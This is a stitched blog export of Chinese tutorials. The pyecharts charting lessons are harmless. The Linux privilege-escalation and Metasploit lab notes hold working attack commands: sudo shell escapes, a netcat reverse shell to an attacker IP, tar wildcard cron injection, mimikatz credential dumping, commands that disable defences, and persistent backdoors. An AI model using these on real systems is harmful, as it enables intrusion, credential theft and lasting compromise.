bar.render(\u0026#34;基础柱状图.html\u0026#34;) 基础时间线柱状图 前置知识 Timelime()\u0026ndash;时间线 柱状图描述的是分类数据,回答的是每一个分类中『有多少?』这个问题. 这是柱状图的主要特点,同时柱状图很难动态的描述一个趋势性的数据. 这里pyecharts为我们提供了一种解决方案-时间线\n如果说一个Bar、Line对象是一张图表的话,时间线就是创建一个一维的x轴,轴上每一个点就是一个图表对象\n快速上手：创建时间线\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pyecharts.charts import Bar,Timeline from pyecharts.options import * bar1 = Bar() bar1.add_xaxis([\u0026#34;中国\u0026#34;,\u0026#34;美国\u0026#34;,\u0026#34;英国\u0026#34;]) bar1.add_yaxis(\u0026#34;GPD\u0026#34;,[30,20,10],label_opts=LabelOpts(position=\u0026#34;right\u0026#34;)) bar1.reversal_axis() bar2 = Bar() bar2.add_xaxis([\u0026#34;中国\u0026#34;,\u0026#34;美国\u0026#34;,\u0026#34;英国\u0026#34;]) bar2.add_yaxis(\u0026#34;GPD\u0026#34;,[50,30,20],label_opts=LabelOpts(position=\u0026#34;right\u0026#34;)) bar2.reversal_axis() # 创建时间线对象 timeline = Timeline() # timeline对象添加bar柱状图 timeline.add(bar1,\u0026#34;2021年GDP\u0026#34;) timeline.add(bar2,\u0026#34;2022年GDP\u0026#34;) # 通过时间线绘图 timeline.render(\u0026#34;基础柱状图-时间线.html\u0026#34;) 自动播放 1 2 3 4 5 6 7 # 设置自动播放 timeline.add_schema( play_interval=1000,\t# 自动播放的时间间隔 is_timeline_show=True,\t# 是否在自动播放时显示时间线 is_auto_play=True,\t# 是否自动播放 is_loop_play=True\t# 是否循环自动播放 ) 主题（颜色）设置 1 2 3 4 from pyecharts.globals import ThemeType # 创建时间线对象，注意代码位置在创建时间线对象之后，向时间线添加bar之前 timeline = Timeline({\u0026#34;theme\u0026#34;:ThemeType.LIGHT}) 主题代码一览：\n编号 颜色 备注 ThemeType.WHITE 红蓝 默认颜色等同于 bar = Bar（） ThemeType.LIGHT 蓝黄粉 高亮颜色 ThemeType.DARK 红蓝 黑色背景 ThemeType.CHALK 红蓝绿 黑色背景 ThemeType.ESSOS 红黄 暖色系 ThemeType.INFOGRAPHIC 红蓝黄 偏亮 ThemeType.MACARONS 紫绿 ThemeType.PURPLE_PASSION 粉紫 灰色背景 ThemeType.ROMA 红黑灰 偏暗 ThemeType.ROMANTIC 红粉蓝 淡黄色背景 实操上手 观察图样并分析，发现最终效果图中需要：\nGDP数据处理为亿级 有时间轴，按照年份为时间轴的点 x轴和y轴翻转，同时每一年的数据只要前8名国家 有标题，标题的年份会动态更改 设置了主题为LIGHT 数据处理 下载本节所需要的数据百度网盘 请输入提取码，用记事本等文本编辑器打开，发现是下面这种以逗号隔开的简单数据格式：\n1 2 3 4 5 6 7 8 year,GDP,rate 1960,美国,5.433E+11 1960,英国,73233967692 1960,法国,62225478000 1960,中国,59716467625 1960,日本,44307342950 1960,加拿大,40461721692 ......以下省略...... 首先是 读取文件，注意这里因为文字编码的原因要用 GB2312 格式打开，不过不知道为什么也没关系，其次就是要调用之前学到的readlines方法按行读取全部数据\n1 2 3 f = open(\u0026#39;T:/1960-2019全球GDP数据.csv\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;GB2312\u0026#39;) data_lines = f.readlines() f.close() print打印一下看看：\n['year,GDP,rate\\n', '1960,美国,5.433E+11\\n', '1960,英国,73233967692\\n', ......\n很好，看来它的格式是列表，接下来把第一条表头删去\n1 data_lines.pop(0) 下面要将列表形式的数据转为字典存储，格式为：{年份:[[国家1:gdp],[国家2:gdp],......],年份:[[国家1:gdp],[国家2:gdp],......]}\n使用 for 循环加上6.3 数据容器：字符串中2.3字符串的分割取得我们需要的各部分元素\n‼️‼️ 注意：按照我们上面的构想，在循环时会出现两种情况——\n第一种：这个年份的key字典里已经有了，所以我只要往它的value里追加内容就行；\n第二种：正好循环到了一个新的年份，这时候字典里还没有这个年份的key，如果要像上面一样往这个不存在的key的value里追加内容肯定会报错；\n因此这里我们需要使用异常的捕获！\n1 2 3 4 5 6 7 8 9 10 11 data_dict = {} for line in data_lines: year = int(line.split(\u0026#39;,\u0026#39;)[0])\t# 以整数数字形式而不是字符串存储年份 country = line.split(\u0026#39;,\u0026#39;)[1]\tgdp = float(line.split(\u0026#39;,\u0026#39;)[2])\t# 将部分使用了科学计数法的gdp数值转为正常数字 # 下面将判断字典中是否有指定的key？ try: data_dict[year].append([country,gdp]) except KeyError: data_dict[year] = []\t# 没有就先创一个 data_dict[year].append([country,gdp]) 绘图 通过本节开始的任务分析我们可以得知，要想每年都生成一个柱状图就必须使用for循环刚才的字典文件\n但是因为某些特性，循环时年份不一定是从前到后的顺序，所以这里我们单独对年份排下序再对它进行循环：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 sorted_year_list = sorted(data_dict.keys()) timeline = Timeline() # 创建时间轴 for year in sorted_year_list: data_dict[year].sort(key=lambda element:element[1],reverse=True) yearly_data = data_dict[year][0:8]\t# 排序取前八 # 这里取反是因为构建出的图表按顺序会从下往上排，如果不反转不符合图样要求 yearly_data.reverse()\t# 读者也可注释掉这行比较一下\tx_data = []\t# 含国家 y_data = []\t# 含GDP for country_gdp in yearly_data: x_data.append(country_gdp[0]) y_data.append(country_gdp[1] / 100000000) # y轴添加gdp，记得以亿为单位 忘记什么是lambda函数了？复习一下吧→7.1 进阶函数\n接下来导包并构建柱状图\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from pyecharts.charts import Bar,Timeline from pyecharts.options import *\t# 导包 # 下面的代码也是包含在for year in sorted_year_list:里的 bar = Bar() bar.add_xaxis(x_data) bar.add_yaxis(\u0026#34;GDP(亿)\u0026#34;,y_data,label_opts=LabelOpts(position=\u0026#34;right\u0026#34;)) # 反转x、y轴 bar.reversal_axis() # 创建并添加图表到时间轴 timeline.add(bar,str(year)) timeline.add_schema(\t# 别忘了自动播放，不然不显示 play_interval=1000, is_timeline_show=True, is_auto_play=True, is_loop_play=False ) timeline.render() 到目前，当前案例的主体部分已经完成，接下来还差一些小细节\n加个标题(位置在在添加图表到时间轴之前)\n1 2 3 bar.set_global_opts( title_opts = TitleOpts(title=f\u0026#34;{year}年全球前8GDP数据\u0026#34;) ) 改下主题\n1 2 3 4 # 记得导包 from pyecharts.globals import ThemeType # 把创建时间轴的语句改为 timeline = Timeline({\u0026#34;theme\u0026#34;:ThemeType.LIGHT}) 完整版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from pyecharts.charts import Bar,Timeline from pyecharts.options import *\tfrom pyecharts.globals import ThemeType f = open(\u0026#39;T:/1960-2019全球GDP数据.csv\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;GB2312\u0026#39;) data_lines = f.readlines() f.close() data_lines.pop(0) data_dict = {} for line in data_lines: year = int(line.split(\u0026#39;,\u0026#39;)[0])\t# 以整数数字形式而不是字符串存储年份 country = line.split(\u0026#39;,\u0026#39;)[1]\tgdp = float(line.split(\u0026#39;,\u0026#39;)[2])\t# 将部分使用了科学计数法的gdp数值转为正常数字 # 下面将判断字典中是否有指定的key？ try: data_dict[year].append([country,gdp]) except KeyError: data_dict[year] = []\t# 没有就先创一个 data_dict[year].append([country,gdp]) sorted_year_list = sorted(data_dict.keys()) timeline = Timeline({\u0026#34;theme\u0026#34;:ThemeType.LIGHT}) # 创建时间轴 for year in sorted_year_list: data_dict[year].sort(key=lambda element:element[1],reverse=True) yearly_data = data_dict[year][0:8]\t# 排序取前八 # 这里取反是因为构建出的图表按顺序会从下往上排，如果不反转不符合图样要求 yearly_data.reverse()\t# 读者也可注释掉这行比较一下\tx_data = []\t# 含国家 y_data = []\t# 含GDP for country_gdp in yearly_data: x_data.append(country_gdp[0]) y_data.append(country_gdp[1] / 100000000) # y轴添加gdp，记得以亿为单位 bar = Bar() bar.add_xaxis(x_data) bar.add_yaxis(\u0026#34;GDP(亿)\u0026#34;,y_data,label_opts=LabelOpts(position=\u0026#34;right\u0026#34;)) # 反转x、y轴 bar.reversal_axis() bar.set_global_opts( title_opts = TitleOpts(title=f\u0026#34;{year}年全球前8GDP数据\u0026#34;) ) # 创建并添加图表到时间轴 timeline.add(bar,str(year)) timeline.add_schema(\t# 别忘了自动播放，不然不显示 play_interval=1000, is_timeline_show=True, is_auto_play=True, is_loop_play=False ) timeline.render() 成品展示\n尾声 至此，第一阶段的Python基础编程已经学完，下面我们要学习第二阶段Python面向对象的编程~\n","date":"2025-12-10T18:14:35+08:00","permalink":"https://www.retr0.xyz/p/10.5-%E7%BB%83%E4%B9%A0%E4%B8%89%E5%8A%A8%E6%80%81%E6%9F%B1%E7%8A%B6%E5%9B%BE/","title":"10.5 练习三：动态柱状图"},{"content":" 第一部分中将会使用到kali攻击机和linux靶机（在资源库的安全靶场类中linsec.ova中下载）\n其中，靶机默认用户名：bob，密码：secret（账户权限：普通）\n为了方便操作，我们使用攻击机对靶机进行ssh连接：\n1 ssh bob@[靶机ip] Linux提权 直接提权 1 sudo su 切换到ash终端 ash（Almquist Shell）是一种轻量级的Unix/Linux命令行解释器，主要用于执行命令和管理文件系统。\n1 sudo ash 使用awk命令 1 sudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; 切换到bash终端 1 sudo bash 切换到csh终端 1 sudo csh curl读取shadow获取加密后的密码（穷举破解） 1 sudo curl file:///etc/shadow 切换到dash终端（小型设备适用） 1 sudo dash ed文本编辑器（一次只能编辑一行） 1 2 sudo ed !/bin/sh\t发现输出内容和命令行类似，可以直接当作终端使用 env查询环境变量同时执行sh（顺手的事） 1 sudo env /bin/sh expect自动化脚本 1 sudo expect -c \u0026#39;spawn /bin/sh;interact\u0026#39; find查找同时执行sh（顺手的事*2） 1 sudo find . -exec /bin/sh \\; -quit ftp协议 1 2 sudo ftp !/bin/sh less/more查看（顺手的事*3） 1 2 3 4 5 sudo less /etc/passwd\t或\tsudo more /etc/passwd !/bin/sh man文档查看 1 2 sudo man man !/bin/sh socat网络工具 1 sudo socat stdin exec:/bin/sh ssh连接 1 sudo ssh -o ProxyCommand=\u0026#39;;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; x vi文本编辑器 1 sudo vi -c \u0026#39;:!/bin/sh\u0026#39; /dev/null 切换到zsh终端 1 sudo zsh pico 1 2 3 sudo pico ^R^X(Ctrl+R Ctrl+X) reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 rvim文本编辑器（适用于有python3的环境） 1 sudo rvim -c \u0026#39;:python3 import os; os.excel(\u0026#34;/bin/sh\u0026#34;,\u0026#34;sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;reset; exec sh\u0026#34;)\u0026#39; perl 1 sudo perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; tclsh 1 2 sudo tclsh exec /bin/sh \u0026lt;@stdin \u0026gt;@stdout 2\u0026gt;@stderr git 1 2 sudo git -p help config !/bin/sh script 1 sudo script -q /dev/null taskset 1 sudo taskset 1 /bin/sh -p 密码破解 查看/etc/passwd文件\n1 cat /etc/passwd 将用户名后的密文复制到md5在线解密破解,md5解密加密进行破解\n例如用户名：hello 密码：nihao（破解后）\n使用su hello并输入密码来切换到这个用户权限\ntar命令注入 原理：cat /etc/crontab查看自动执行的任务，因此可以将自己的木马程序替换进自动化任务当中\n生成木马源代码：\n1 msfvenom -p cmd/unix/reverse_netcat lhost=[攻击机ip] lport=[端口号] R 例如：mkfifo /tmp/qrmq; nc 192.168.80.133 2233 0\u0026lt;/tmp/qrmq | /bin/sh \u0026gt;/tmp/qrmq 2\u0026gt;\u0026amp;1; rm /tmp/qrmq\n使用echo写入代码到shell.sh并用chmod修改权限\n1 echo \u0026#34;木马代码\u0026#34; \u0026gt; shell.sh \u0026amp;\u0026amp; chmod +x shell.sh 接下来创建两个文件：\n1 2 echo \u0026gt; \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; echo \u0026gt; \u0026#34;--checkpoint=1\u0026#34; 这两个文件使得Linux在执行原先的打包备份任务时不会将其视为文件，而是直接借助其高级权限执行木马程序代码\n所以根据我们开始时分析的计划任务列表，只要每过一分钟代码就会被执行一次，启动攻击机：\n1 nc -lvvp [端口号] 等上(最多)一分钟就好了~\n","date":"2025-12-09T16:18:30+08:00","permalink":"https://www.retr0.xyz/p/1.10-linux%E6%8F%90%E6%9D%83%E5%92%8C%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","title":"1.10 Linux提权和密码破解"},{"content":"meterpreter 本部分使用Kali系统\nhost注入 在meterpreter中先使用background将当前连接挂起\nshow options\t查看配置方法\nset ip [自己的ip] 这里的ip是之后目标指向的ip\nset domain [要篡改的域名]\t要伪造什么域名\nset sessions [目标session]\t对哪个session id进行修改\nrun\t运行\n用户认证钓鱼 run post/windows/gather/phish_windows_credentials\n会在目标桌面弹出管理员认证窗口\npassTheHash 必须是system权限\nrun post/windows/gather/hashdump\t获取操作系统的hash值\n可以获取管理员(Administrator)密码加密之后的密码，之后使用穷举的方法破解\nmimikatz（Windows版） 本部分使用Win10攻击机及Win7靶机\n我们使用C:\\tools\\alltools\\密码破解下的mimikatz_trunk.rar软件，将压缩包传入到靶机上并解压，如果不能直接拖动复制（没有安装VM tools）建议使用 免费在线文件传输工具 - 零代码快传\n解压后文件夹内的双击两个快捷方式可一键执行命令，也可进入Win32或x64文件夹（分别对应32和64位）内打开软件控制台手动输入命令\n获取账户密码 其中，在Win32文件夹内有常用命令.txt可供参考:\n1 2 3 4 5 6 7 8 9 10 11 12 privilege::debug 当前进程提升为debug权限 inject::process lsass.exe sekurlsa.dll 注入lsass.exe进程 sekurlsa::logonPasswords 列出所有用户密码 system::user 当前用户名 system::computer 当前主机名 process::list 列出所有进程 process::modules 列出当前加载模块 ts::multirdp 支持多用户远程登录 我们依次执行前三个命令，这时会在wdigest后显示密码\n提示：Windows 8 前密码会以明文形式存储在内存中，因此直接获取明文只对Win8之前有效。\n扫雷外挂（?） 打开位于tools文件夹下的winmine.exe\n在mimikatz窗口中执行命令winmine::infos，即可查看所有雷的位置\nmimikatz（Kali版） 本部分继续使用meterpreter控制台\n在一个已连接的session中输入load mimikatz（如果失败请用load kiwi）加载mimikatz模块\n使用help（失败请用help kiwi）可以查看有哪些功能，例如：\ncreds_all列出所有凭据\ncreds_kerberos 拿到Kerberos凭据\ncreds_msv获取加密后的密码（Win8之后适用）\n防火墙和3389端口 本部分继续使用meterpreter控制台\n安全措施的处理 在shell中：\nnetsh advfirewall set allprofiles state off\t关闭防火墙\nnet stop windefend\t关闭defener（Windows自带杀软）\nbcdedit.exe /set {current} nx AlwaysOff\t关闭dep（数据执行保护）\n在meterpreter中（不好用）：\nrun killav\t关闭杀软\n或run post/windows/manage/killav\n开启3389（远程桌面）端口 run post/windows/manage/enable_rdp\t打开3389端口\n或\nrun getgui -e\t（不太靠谱）\nrun getgui -u 用户名 -p 密码\t在目标上创建新的用户账户（不好用）\n连接远程桌面 不要在meterpreter中输入，直接在新的终端窗口中输入：\nrdesktop -u [用户名] -p [密码] [目标ip]\t使用图形界面控制远程桌面\n永久后门植入 为什么需要永久后门的植入？\nmeterpreter是运行在内存里的，重启消失，所以需要植入后门\n常见方法：卸载对方的补丁，给对方安装一些有漏洞的软件（比如说ftp程序、输入法\u0026hellip;\u0026hellip;）\n这里使用meterpreter自带的功能\n方法一（正向连接，不一定成功） 安装服务\nbackground\t挂起连接\nrun metsvc -A\t设定一个31337端口上传后门文件\n查看服务\njobs\t可以看到metsvc_bind_tcp\n连接\n1 2 3 4 5 use exploit/multi/handler set payload windows/metsvc_bind_tcp set rhost [目标ip] set lport 31337 run 方法二（反向连接） 课上教的（不可用，原因未知） 植入启动型后门\n在session中：\nrun persistence -A -S -U -i [多少秒联系一次] -p [端口号] -r [自己的ip] 植入启动型后门\n或者\nrun persistence -X -i [多少秒联系一次] -p [端口号] -r [自己的ip]\t（成功率更高）\n会打开一个新的session，之后目标启动后会自动连接上控制端\n实践可用 1 2 3 4 5 background\t挂起连接 use exploit/windows/local/persistence_service\t转到persistence脚本 show options\t查看配置方法 set session [编号] run ","date":"2025-12-06T15:32:40+08:00","permalink":"https://www.retr0.xyz/p/1.9-msf%E6%A4%8D%E5%85%A5%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8/","title":"1.9 msf植入永久后门"},{"content":"系统权限 Windows 最高：SYSTEM\n用户最高:Administrator\nothers\nLinux 最高：root\n其他都是普通\nCPU权限 OS（操作系统）\nring0（驱动程序）\nring3（大多数其他软件）\n目标信息搜集 以下命令均在meterpreter \u0026gt;上执行\n系统信息 run post/windows/gather/checkvm\n检查目标是否是虚拟机\nrun post/windows/gather/enum_services\n查看目标系统上运行的服务（例如有VM tools必为虚拟机）\nrun post/windows/gather/enum_applications\n查看目标系统上安装的软件\nrun post/windows/gather/dumplinks\n查看目标系统上最近的操作\nrun post/windows/gather/enum_shares\n查看是否开启了共享\nrun post/windows/gather/enum_patches\n查看目标安装了那些补丁\nrun winenum\n查看环境变量\n数据嗅探和wireshark的使用 注意： 首先执行load sniffer加载sniffer模块\nsniffer_interfaces\t查看对方网卡（判断是否启用dhcp:true大概率启用）\nsniffer_start [网卡编号]\t开始嗅探指定网卡\nsniffer_start [网卡编号]\t停止嗅探指定网卡\nsniffer_dump [网卡编号] [路径及文件名]\t将嗅探到的数据保存到指定文件中\n例如：sniffer_dump 2 /home/kali/Desktop/123.cap\n过滤器的使用 点击打开保存的文件，可以在过滤器中输入ip.src_host==[ip地址]来过滤目标发出的数据包\n在过滤器中输入ip.dst_host==[ip地址]来过滤返回的数据包\n!(ip.src_host==[ip地址])\t过滤除了某个ip以外的所有数据包\ntcp 或udp等\t只查看某种协议的数据包\n组合使用： ip.src_host==[ip地址] \u0026amp;\u0026amp; tcp\n其余自行摸索\n常见网络协议 以下是网络通信中最常见的协议分类整理，包含 协议名称、中文名、核心作用 及关键补充说明，按功能场景分组便于理解：\n核心传输层协议（负责端到端数据传输） 协议名称 中文名 核心作用 关键特点 TCP 传输控制协议 提供可靠、面向连接的字节流传输 三次握手建立连接、四次挥手断开、重传机制（保证数据不丢失/不重复），适用于文件传输、网页加载等场景 UDP 用户数据报协议 提供无连接、不可靠的数据包传输 无握手过程、低延迟，适用于视频通话、游戏、直播等对实时性要求高于可靠性的场景 网络层协议（负责路由与寻址） 协议名称 中文名 核心作用 关键特点 IP 网际协议 定义数据包格式，实现跨网络设备的寻址与转发 TCP/UDP 的底层支撑，仅负责“送达”，不保证可靠性（IPv4 是目前主流，IPv6 逐步普及） ICMP 互联网控制消息协议 用于网络设备间的差错报告与状态查询 常见场景：ping 命令（检测主机可达性）、 traceroute（追踪路由路径） ARP 地址解析协议 将 IP 地址转换为物理地址（MAC 地址） 局域网内通信必需，解决“知道对方 IP 但不知道硬件地址”的问题 RARP 反向地址解析协议 将 MAC 地址转换为 IP 地址 适用于无 DHCP 服务器的场景（如早期无盘工作站） IGMP 互联网组管理协议 用于主机加入/退出多播组 支持视频会议、组播直播等“一对多”通信场景 应用层协议（直接面向用户业务） 协议名称 中文名 核心作用 关键特点 DNS 域名系统协议 将域名（如 www.baidu.com）解析为 IP 地址 解决“记 IP 难”的问题，是互联网访问的“地址簿” HTTP 超文本传输协议 用于 Web 浏览器与服务器之间的网页传输 明文传输（不安全），默认端口 80，支撑普通网页访问 HTTPS 安全超文本传输协议 HTTP + TLS/SSL 加密，实现安全的网页传输 加密数据（防窃听/篡改），默认端口 443，用于支付、登录等敏感场景 FTP 文件传输协议 用于客户端与服务器之间的文件上传/下载 明文传输，默认端口 21（控制）+ 20（数据），适用于非敏感文件传输 SFTP SSH 文件传输协议 基于 SSH 加密的文件传输协议 加密传输（替代 FTP），默认端口 22，安全性更高 SSH 安全外壳协议 远程登录服务器并执行命令 加密传输（替代 Telnet），默认端口 22，是服务器管理的核心协议 Telnet 远程终端协议 远程登录服务器（明文传输） 无加密（不安全），默认端口 23，仅用于测试或非敏感环境 SMTP 简单邮件传输协议 用于发送电子邮件（服务器到服务器） 默认端口 25（明文）/ 465（SSL 加密），支撑邮件发送功能 POP3 邮局协议版本 3 用于接收电子邮件（客户端到服务器） 下载邮件到本地，默认端口 110（明文）/ 995（SSL 加密） IMAP4 互联网邮件访问协议版本 4 接收电子邮件（支持邮件同步） 可在多设备同步邮件状态（已读/未读），默认端口 143（明文）/ 993（SSL 加密） NTP 网络时间协议 实现网络设备间的时间同步 保证服务器、终端等设备时间一致，默认端口 123（UDP） DHCP 动态主机配置协议 自动为客户端分配 IP 地址、子网掩码等网络参数 无需手动设置 IP，适用于局域网（如家庭、公司网络） SNMP 简单网络管理协议 监控和管理网络设备（路由器、交换机等） 收集设备状态（如流量、负载），默认端口 161（UDP） TFTP 简单文件传输协议 轻量级文件传输（无认证） 仅支持简单上传/下载，无权限验证，默认端口 69（UDP），适用于设备固件升级 其他常用协议（特殊功能场景） 协议名称 中文名 核心作用 关键特点 PPPoE 基于以太网的点对点协议 用于宽带拨号上网（如电信、联通家庭宽带） 实现“账号+密码”认证，建立互联网连接 L2TP 第二层隧道协议 与 IPsec 配合实现 VPN 连接 用于远程办公访问公司内网，默认端口 1701 IPSec IP 安全协议 为 IP 数据包提供加密、认证服务 常用于 VPN 加密（如 L2TP/IPSec、IKEv2），保障跨网传输安全 MQTT 消息队列遥测传输协议 轻量级物联网（IoT）设备通信协议 低带宽、低功耗，适用于传感器、智能家居设备的数据传输 ","date":"2025-12-04T22:10:13+08:00","permalink":"https://www.retr0.xyz/p/1.8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%8F%8A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","title":"1.8 操作系统权限及密码破解"},{"content":"前置知识 基础地图演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pyecharts.charts import Map from pyecharts.options import VisualMapOpts map = Map() data = [ (\u0026#39;北京市\u0026#39;,99), (\u0026#39;上海市\u0026#39;,199), (\u0026#39;湖南省\u0026#39;,299), (\u0026#39;台湾省\u0026#39;,199), (\u0026#39;安徽省\u0026#39;,299), (\u0026#39;广州省\u0026#39;,399), (\u0026#39;湖北省\u0026#39;,599) ] map.add(\u0026#39;地图\u0026#39;,data,\u0026#39;china\u0026#39;) map.render() 这样只实现了基础的数据导入，看起来地图还不够直观，所以我们使用全局设置\n1 2 3 4 5 6 7 8 9 10 11 12 13 map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) 成果展示：\n实操部分 全国疫情地图 数据准备 之前贴出来的所用数据有问题，这里给出新的：百度网盘 请输入提取码，目测没有不符合json格式的地方\n我们再次使用之前的json视图网站JSON在线视图查看器(Online JSON Viewer)，把json内容粘贴进去可见其结构主要如下面所示：\n制定主要任务列表：\n打开并读取文件 取其中省份及其对应确诊人数 将取出的数据转换为适当的格式 将数据导入到地图中 配置地图全局设置 生成地图 开始（分块讲解） 我们直接开始读取文件\n1 2 3 txt = open(\u0026#34;T:/疫情.txt\u0026#34;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) data = txt.read() txt.close() 现在txt中的内容已经加载到data变量中了，接下来我们取其中数据\n1 2 3 import json dict = json.loads(data) pro_list = dict[\u0026#39;areaTree\u0026#39;][0][\u0026#39;children\u0026#39;] 由之前经验可得，需要将每个省份及其对应确诊人数写成一个元组，再将所有元组封装为一个列表才能导入到pyecharts模块中。\n1 2 3 4 5 data_list=[] for pro_data in pro_list: pro_name = pro_data[\u0026#39;name\u0026#39;] pro_confirm = pro_data[\u0026#39;total\u0026#39;][\u0026#39;confirm\u0026#39;] data_list.append((pro_name,pro_confirm)) 下面是制图部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pyecharts.charts import Map from pyecharts.options import VisualMapOpts map = Map() map.add(\u0026#39;全国确诊情况\u0026#39;,data_list,\u0026#39;china\u0026#39;) map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) 整合完全版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import json from pyecharts.charts import Map from pyecharts.options import VisualMapOpts txt = open(\u0026#34;T:/疫情.txt\u0026#34;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) data = txt.read() txt.close() dict = json.loads(data) pro_list = dict[\u0026#39;areaTree\u0026#39;][0][\u0026#39;children\u0026#39;] data_list=[] for pro_data in pro_list: pro_name = pro_data[\u0026#39;name\u0026#39;] pro_confirm = pro_data[\u0026#39;total\u0026#39;][\u0026#39;confirm\u0026#39;] data_list.append((pro_name,pro_confirm)) map = Map() map.add(\u0026#39;全国确诊情况\u0026#39;,data_list,\u0026#39;china\u0026#39;) map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) map.render() 结果展示：\n附加小练习：江苏疫情地图 提示： 地图类型从\u0026rsquo;china\u0026rsquo;改为\u0026rsquo;江苏\u0026rsquo;，剩余请自行挑战。\n数据准备 注意：原来的数据在地名上有问题（缺少“省”、“市”后缀），我只补全了省份名称和江苏省各市名称，如有需要请自行补全。\n根据上面得到的数据结构确定如何取出数据\n整合完全版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import json from pyecharts.charts import Map from pyecharts.options import VisualMapOpts txt = 